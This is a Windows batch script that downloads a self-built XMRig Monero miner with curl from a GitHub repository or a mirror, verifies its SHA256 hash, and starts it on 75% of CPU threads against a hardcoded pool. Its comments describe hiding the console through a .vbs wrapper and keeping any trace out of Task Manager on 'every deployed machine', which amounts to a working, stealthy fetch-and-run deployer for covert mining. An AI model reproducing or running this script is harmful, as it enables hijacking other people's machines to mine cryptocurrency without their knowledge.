@echo off
setlocal enabledelayedexpansion
cd /d "%~dp0"

rem ---------------------------------------------------------------------------
rem This file is 7-bit ASCII with no BOM, and that is not a style choice.
rem
rem cmd.exe reads a .bat using the *console* code page, not the file encoding,
rem and chcp takes effect too late for lines it has already buffered.  With
rem UTF-8 Chinese in here, on a console that starts at code page 936, the
rem parser intermittently loses byte alignment: it swallows part of a line and
rem then reports the remainder as an unknown command.  Measured on Windows 11
rem at roughly 1 run in 8 -- with a BOM and without one -- which means it
rem passes every test you run and fails in the field.  Hence ASCII only.
rem ---------------------------------------------------------------------------

rem No console window, ever: start this via XMR_Rig-Silent.vbs, the .vbs next
rem to it, which is the double-click target.  A .bat cannot hide its own
rem window -- cmd.exe creates it before the first line runs, and on Windows 11
rem that window belongs to Windows Terminal, a separate process, so nothing
rem inside the script can hide it.  Only a GUI-subsystem host can, and that
rem means wscript.exe running a .vbs.
rem
rem The older scripts here hide themselves with
rem     start mshta vbscript:createobject("wscript.shell").run(...,0)
rem That no longer works.  Windows 11 24H2+ drops the VBScript and JScript
rem engines from mshta: it exits 0, does nothing, and the script silently
rem never runs a single download.  wscript.exe still has VBScript, so the
rem .vbs wrapper below is the way.

title XMRig 6.26.0 Self Single-File Auto_Mining

set "VERSION=6.26.0"

rem Single-file build: one exe, nothing to unpack.
set "ASSET=windows-x64-doubleclick.exe"
set "EXE=%CD%\xmrig.exe"
set "LOG=%CD%\XMR_Rig_%VERSION%.log"

rem Served from Mining/Self_xmr/ in the repository.
set "RAW_URL=https://github.com/acu715/acu715/raw/refs/heads/main/Mining/Self_xmr/%ASSET%"

rem github.com is unreachable from mainland China.  Mirror first, direct
rem second, whichever verifies wins.
set "MIRROR_URL=https://gh-proxy.com/%RAW_URL%"

rem SHA256 of the exe.  The mirror sometimes truncates large downloads and
rem curl still exits 0, so "the file exists" proves nothing -- check content.
rem Must be updated whenever the artifact is rebuilt.
set "SHA256=3060770f13041a462852e6b360b9bf6cde81cad00fd958be2bc8901055471015"

echo [%DATE% %TIME%] start >>"%LOG%"
echo [INFO] XMRig %VERSION% (self-built, 0%% developer fee)
echo [INFO] Target: %EXE%

rem Reuse an existing copy only if it hashes correctly.
if exist "%EXE%" (
    echo [INFO] Existing file found, verifying SHA256...
    call :CHECK_HASH "%EXE%"
    if !HASH_OK! == 1 (
        echo [INFO] Verified, skipping download.
        goto :RUN_XMR
    )
    echo [WARN] Failed verification, deleting and re-downloading.
    echo [WARN] existing file failed hash check >>"%LOG%"
    del /q "%EXE%" 2>nul
)

where curl >nul 2>nul
if !errorlevel! neq 0 (
    echo [ERROR] curl not found, cannot download.
    echo         Windows older than 10 1803 does not ship curl.
    goto :FAIL
)

set "GOT=0"
call :TRY_DOWNLOAD "%MIRROR_URL%" "mirror"
if !GOT! == 0 call :TRY_DOWNLOAD "%RAW_URL%" "direct"

if !GOT! == 0 (
    echo [ERROR] Both mirror and direct download failed.
    goto :FAIL
)

echo [OK] Downloaded, verifying SHA256...
echo [%DATE% %TIME%] download complete >>"%LOG%"
call :CHECK_HASH "%EXE%"
if !HASH_OK! neq 1 (
    echo [ERROR] SHA256 mismatch: incomplete or altered file.
    echo [ERROR] expected %SHA256% >>"%LOG%"
    echo [ERROR] actual   !HASH_ACTUAL! >>"%LOG%"
    del /q "%EXE%" 2>nul
    goto :FAIL
)
echo [OK] Verified.
echo.

:RUN_XMR
echo [INFO] Pool: built in (default 58.176.17.24:3334, --no-tls for 3333)
echo [INFO] Threads: 75%% of logical CPUs (xmrig computes the count)
echo [INFO] Starting XMRig...
echo [%DATE% %TIME%] run "%EXE%" --75 >>"%LOG%"

rem --75 is shorthand for --cpu-max-threads-hint=75.
rem The single-file build has the pool baked in, so no --url/--user here.
rem
rem start /b matters here.  Running the exe directly would look like it returns
rem at once -- it is GUI subsystem, so cmd does not normally wait for it -- but
rem the redirection is the catch: cmd has to hold the log handle on the child's
rem behalf, so it blocks on this line and stays alive for as long as the miner
rem runs.  That leaves a hidden cmd.exe sitting in Task Manager on every
rem deployed machine.  start hands the handles over and returns.  "" is the
rem window title that start would otherwise take the exe path for.
start "" /b "%EXE%" --75 >>"%LOG%" 2>&1

endlocal
exit /b 0

rem ---------------------------------------------------------------------------
rem Subroutines
rem ---------------------------------------------------------------------------

rem Fetch to a temp name and move it into place only after it verifies, so a
rem truncated transfer can never masquerade as the finished file.
:TRY_DOWNLOAD
echo [INFO] Downloading from %~2...
echo [%DATE% %TIME%] trying %~2 >>"%LOG%"
curl -fL --retry 2 --connect-timeout 15 -o "%EXE%.tmp" "%~1" >>"%LOG%" 2>&1
if !errorlevel! neq 0 (
    echo [WARN] %~2 failed, trying next source.
    del /q "%EXE%.tmp" 2>nul
    exit /b 1
)
call :CHECK_HASH "%EXE%.tmp"
if !HASH_OK! neq 1 (
    echo [WARN] %~2 returned a bad file, trying next source.
    echo [WARN] %~2 failed hash check >>"%LOG%"
    del /q "%EXE%.tmp" 2>nul
    exit /b 1
)
move /y "%EXE%.tmp" "%EXE%" >nul
set "GOT=1"
exit /b 0

rem Compare content, not size: catches truncation and corrupt pages alike.
rem certutil prints a header line, the hex digest, then a trailer; findstr
rem keeps only the digest, so do NOT skip lines here.
:CHECK_HASH
set "HASH_OK=0"
set "HASH_ACTUAL="
if not exist "%~1" exit /b 1
for /f "delims=" %%H in ('certutil -hashfile "%~1" SHA256 ^| findstr /r /i "^[0-9a-f]"') do (
    if not defined HASH_ACTUAL set "HASH_ACTUAL=%%H"
)
if not defined HASH_ACTUAL exit /b 1
set "HASH_ACTUAL=!HASH_ACTUAL: =!"
if /i "!HASH_ACTUAL!" == "%SHA256%" set "HASH_OK=1"
exit /b 0

rem `pause` would hang forever with no console, so failures raise a msgbox.
:FAIL
echo [%DATE% %TIME%] failed >>"%LOG%"
powershell -NoProfile -Command "[void][Reflection.Assembly]::LoadWithPartialName('PresentationFramework');[System.Windows.MessageBox]::Show('XMRig download or verification failed. See the log next to this script.','XMRig','OK','Error')" >nul 2>&1
endlocal
exit /b 1
